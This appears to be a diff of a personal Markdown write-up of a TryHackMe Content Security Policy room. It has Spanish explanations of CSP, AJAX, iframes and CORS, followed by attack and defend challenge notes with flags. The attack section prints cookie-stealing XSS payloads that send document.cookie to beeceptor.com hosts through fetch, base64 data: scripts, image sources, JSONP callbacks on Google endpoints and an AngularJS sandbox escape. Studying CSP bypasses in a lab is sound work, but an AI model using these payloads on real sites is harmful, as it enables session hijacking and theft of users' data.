@@ -37,7 +37,6 @@ Content Security Policy (CSP) es un mecanismo de seguridad que te permite especi
 
 Un ejemplo de configuración de CSP es el siguiente:
 
-
 `Content-Security-Policy: default-src 'self'; img-src 'self' img.example.com; script-src 'self' code.jquery.com`
 
 En este ejemplo, el navegador sólo permitirá que se carguen imágenes desde el mismo origen ( 'self' ) o desde img.example.com , y sólo permitirá que se ejecuten scripts desde el mismo origen o desde code.jquery.com.
@@ -82,7 +81,6 @@ AJAX es el acrónimo de Asynchronous JavaScript and XML. Es una técnica que per
 
 Un ejemplo de cómo se realiza una petición AJAX con el objeto XMLHttpRequest es el siguiente:
 
-
 `var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() {     if (this.readyState == 4 && this.status == 200) {        // Aqui se maneja la respuesta del servidor        document.getElementById("demo").innerHTML = this.responseText;     } }; xhttp.open("GET", "ajax_info.txt", true); xhttp.send();`
 
 En este ejemplo se crea un nuevo objeto XMLHttpRequest, se define una función para manejar la respuesta del servidor, se abre una conexión GET con el archivo "ajax_info.txt" y se envía la petición al servidor. Si el servidor responde con éxito, la respuesta se inserta en un elemento con el ID "demo".
@@ -92,7 +90,6 @@ Existen otras alternativas como Jquery.ajax() que es una manera mas resumida y a
 Un iframe es un elemento HTML que permite a los desarrolladores web insertar una página web dentro de otra página web. El contenido del iframe se mostrará en un área rectangular dentro de la página principal y puede ser de cualquier origen, incluso de otro dominio.
 
 Ejemplo de cómo se utiliza un iframe:
-
 
 `<iframe src="https://www.example.com" width="600" height="400"></iframe>`
 
@@ -108,15 +105,12 @@ Cuando un navegador envía una solicitud a un servidor para acceder a un recurso
 
 Un ejemplo de cómo un servidor puede configurar CORS es el siguiente:
 
-
-
 `Access-Control-Allow-Origin: https://www.example.com`
 
 En este ejemplo, el servidor está indicando que sólo las páginas web que tengan origen "[https://www.example.com](https://www.example.com/)" podrán acceder a sus recursos. El servidor puede permitir cualquier origen, especificar varios orígenes permitidos, o utilizar un comodín (*) para permitir cualquier origen.
 
 CORS es un mecanismo de seguridad importante, ya que ayuda a prevenir ataques de origen cruzado, que podrían permitir a un atacante acceder a información confidencial o realizar acciones maliciosas en nombre de un usuario. Sin embargo, también puede causar problemas de acceso si no se configura correctamente, por lo que es importante entender cómo funciona y cómo configurarlo adecuadamente.
 ```
-
 
 ### Sources
 
@@ -187,10 +181,6 @@ En este ejemplo, el script se encuentra dentro de la etiqueta `<script>` y conti
 Los scripts inline son útiles para incluir código JavaScript que se ejecute en una sola página o que sea específico de una página. Sin embargo, también presentan algunos riesgos de seguridad, ya que el código JavaScript se encuentra directamente en la página HTML y puede ser modificado fácilmente para inyectar código malicioso. Por lo tanto, es recomendable evitar su uso y utilizar scripts externos y medidas de seguridad adicionales para proteger la aplicación.
 ```
 
-![[Pasted image 20230111132750.png]]
-
-
-
 ###  Creating a Content Security Policy
 
 Now that we've mentioned some of the most commonly used sources, we can talk about how to build your security policy for your website. For a more interactive way of building your policy, I'd recommend [**report-uri.com's CSP generator**](https://report-uri.com/home/generate) as it's a great tool that you can use to experiment with various CSP settings without having to type them out manually. 
@@ -231,7 +221,6 @@ Express.js, commonly referred to as simply "Express," is a popular JavaScript fr
 An Express-based website is a website that is built using the Express framework. When building an Express-based website, you would use JavaScript to write the server-side logic for the website, and you would use the Express framework to define routes, handle requests and responses, and perform other tasks that are commonly needed when building web applications. Express allows developers to easily create routing,middlewares, template engines and lot of functionality around HTTP Protocol.
 
 Express is designed to be minimal and flexible, making it a good choice for small to medium-sized web applications, but can also scale to be used in large-scale applications as well.
-
 
 JSONP (JSON with Padding) is a technique for making cross-origin requests from a web page to a server, and getting a response in the form of a JavaScript script. JSONP endpoints refer to the server-side endpoint, which is a specific URL that the client-side JavaScript code can make a request to, in order to retrieve or submit data in the JSONP format.
 
@@ -335,10 +324,6 @@ _For verification, all challenges are accessed by a bot locally (**localhost**).
 
 Answer the questions below
 
-![[Pasted image 20230111195911.png]]
-
-![[Pasted image 20230112131251.png]]
-
 Flag for attack-1  
 
 ```
@@ -356,7 +341,6 @@ fetch(`https://urcsp.free.beeceptor.com/${document.cookie}`)
 
 eval(document.location='https://urcsp.free.beeceptor.com/'.concat(document.cookie))
 
-
 ┌──(kali㉿kali)-[~/nappy]
 └─$ curl http://34.243.75.161:3001/ -I
 HTTP/1.1 200 OK
@@ -367,7 +351,6 @@ Content-Length: 390
 ETag: W/"186-PB8tVHaonwWPTr4sUZCK/MqA5KY"
 Date: Thu, 12 Jan 2023 01:24:23 GMT
 Connection: keep-alive
-
 
 enter text:
 
@@ -391,7 +374,6 @@ GET `/flag=THM%7BTh4t_W4s_Pr3tty_3asy%7D`
 
 then decode url with cyberchef flag=THM{Th4t_W4s_Pr3tty_3asy}
 ```
-
 
 *THM{Th4t_W4s_Pr3tty_3asy}*
 
@@ -424,12 +406,10 @@ or
 ZmV0Y2goYGh0dHBzOi8vd2l0dHkuZnJlZS5iZWVjZXB0b3IuY29tLyR7ZG9jdW1lbnQuY29va2ll
 fWAp
 
-
 <script src="data:;base64,ZmV0Y2goYGh0dHBzOi8vd2l0dHkuZnJlZS5iZWVjZXB0b3IuY29tLyR7ZG9jdW1lbnQuY29va2ll
 fWAp"></script>
 
 :)
-
 
 GET `/flag=THM%7BUs1ng_data:_1snt_Any_S4fer%7D`
 
@@ -438,7 +418,6 @@ GET `/flag=THM%7BUs1ng_data:_1snt_Any_S4fer%7D`
 flag=THM{Us1ng_data:_1snt_Any_S4fer}
 
 ```
-
 
 *THM{Us1ng_data:_1snt_Any_S4fer}*
 
@@ -463,7 +442,6 @@ or
 
 <IMG id="witty" src="">
 <script>document.getElementById('witty').src="https://witty.free.beeceptor.com/" + document.cookie;</script>
-
 
 GET `/flag%3DTHM%7BTh4ts_N0t_4n_1m4ge!!%7D`
 
@@ -522,7 +500,6 @@ nice writeup: https://weizman.github.io/page-whatsapp-vuln/
 
 https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt
 
-
 #Google.com:
 
 "><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
@@ -537,9 +514,7 @@ https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt
 
 *.google.com (subdomain)
 
-
 <script src="https://accounts.google.com/o/oauth2/revoke?callback=eval(document.location='https://witty.free.beeceptor.com/'.concat(document.cookie))"></script>
-
 
 GET `/flag=THM%7BN0_JSONP_D0mains_Plz%7D`
 
@@ -547,9 +522,7 @@ GET `/flag=THM%7BN0_JSONP_D0mains_Plz%7D`
 
 flag=THM{N0_JSONP_D0mains_Plz}
 
-
 ```
-
 
 *THM{N0_JSONP_D0mains_Plz}*
 
@@ -585,7 +558,6 @@ or
 {{$on.curry.call().document.location='https://witty.free.beeceptor.com/' + $on.curry.call().document.cookie}}
 </div>
 
-
 GET `/flag=THM%7BTrust_N0_CDN%7D`
 
 429 0.0s a few seconds ago
@@ -593,7 +565,6 @@ GET `/flag=THM%7BTrust_N0_CDN%7D`
 flag=THM{Trust_N0_CDN}
 
 ```
-
 
 *THM{Trust_N0_CDN}*
 
@@ -623,12 +594,9 @@ flag=THM{Th1s_4udio_S0unds_N1ce}
 
 This appears to be a script that attempts to inject malicious code into a website. The script attempts to load an audio file from a remote server, and appends the current user's cookies to the URL. The script could potentially be used to steal user data, or execute other malicious actions. It's important not to execute this script or to be careful when visiting websites that use it.
 
-
 ```
 
-
 *THM{Th1s_4udio_S0unds_N1ce}*
-
 
 ### CSP Sandbox :: Defend challenges
 
@@ -637,8 +605,6 @@ To deploy the machine, go to the **CSP Sandbox** task.
 **Defend** challenges require you to defend the website from XSS attacks by creating a CSP header that blocks them, whilst allowing the legitimate scripts to execute.
 
 Answer the questions below
-
-![[Pasted image 20230112131231.png]]
 
 What is the flag for defend-1?  
 
@@ -663,7 +629,6 @@ adding: Content-Security-Policy: script-src 'self'
 so enter
 
 script-src 'self'
-
 
 <br><i>The attackers have sent the following:</i>
 <script>const defend1Real=0||console.log("__EVIL__")</script>
@@ -691,7 +656,6 @@ ETag: W/"267-BP86b/pS4qwW5ko90IpiLspvqsM"
 Date: Thu, 12 Jan 2023 18:17:44 GMT
 Connection: keep-alive
 
-
 view-source:http://54.229.103.59:3009/
 
 <script nonce="ae3b00">defend2Real=true;console.log("__defend-2_REAL="+defend2Real)</script>
@@ -699,7 +663,6 @@ view-source:http://54.229.103.59:3009/
 so enter
 
 script-src 'nonce-ae3b00'
-
 
 <br><i>The attackers have sent the following:</i>
 <script nonce="aaaaaa">const defend2Real=0||console.log("__EVIL__")</script>
@@ -742,7 +705,6 @@ so enter
 
 script-src 'sha256-8gQ3l0jVGr5ZXaOeym+1jciekP8wsfNgpZImdHthDRo='
 
-
 <script>console.log("__EVIL__");</script>
 <svg onload=console.log(`__EVIL__`) />
 _The attackers have sent the following:_ 
@@ -750,11 +712,9 @@ _The attackers have sent the following:_ 
 You have successfully defended the server against attackers!  
 Here's your reward: THM{Hash_Y0ur_1nl1ne_Scr1pts}
 
-
 ```
 
 *THM{Hash_Y0ur_1nl1ne_Scr1pts}*
-
 
 ```
 Playground
@@ -769,10 +729,6 @@ ETag: W/"27e-C7NtyVS9gpQyBNmv0X3TRQElG4w"
 Date: Thu, 12 Jan 2023 18:32:52 GMT
 Connection: keep-alive
 
-
-
 ```
-
-![[Pasted image 20230112133644.png]]
 
 [[Biblioteca]]
